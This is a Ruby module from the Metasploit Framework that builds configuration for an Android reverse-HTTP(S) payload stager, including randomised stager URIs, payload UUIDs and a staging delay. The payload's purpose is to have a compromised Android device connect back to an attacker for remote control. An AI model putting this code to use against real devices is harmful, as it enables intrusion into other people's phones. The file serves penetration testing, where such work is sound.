# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/android/payload_options'
require 'msf/core/payload/uuid/options'

module Msf

###
#
# Complex payload generation for Android that speaks HTTP(S)
#
###

module Payload::Android::ReverseHttp

  include Msf::Payload::TransportConfig
  include Msf::Payload::Android
  include Msf::Payload::Android::PayloadOptions
  include Msf::Payload::UUID::Options

  #
  # Register reverse_http specific options
  #
  def initialize(*args)
    super
    register_advanced_options(Msf::Opt::http_header_options)
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_reverse_http(opts)
  end

  def generate_config(opts={})
    opts[:uuid] ||= generate_payload_uuid
    opts[:uri] ||= luri + generate_uri(opts)
    super(opts)
  end

  #
  # Generate the URI for the initial stager
  #
  def generate_uri(opts={})
    ds = opts[:datastore] || datastore
    uri_req_len = ds['StagerURILength'].to_i

    # Choose a random URI length between 30 and 255 bytes
    if uri_req_len == 0
      uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))
    end

    if uri_req_len < 5
      raise ArgumentError, "Minimum StagerURILength is 5"
    end

    generate_uri_uuid_mode(:init_java, uri_req_len, uuid: opts[:uuid])
  end

  #
  # Always wait at least 20 seconds for this payload (due to staging delays)
  #
  def wfs_delay
    20
  end

end

end


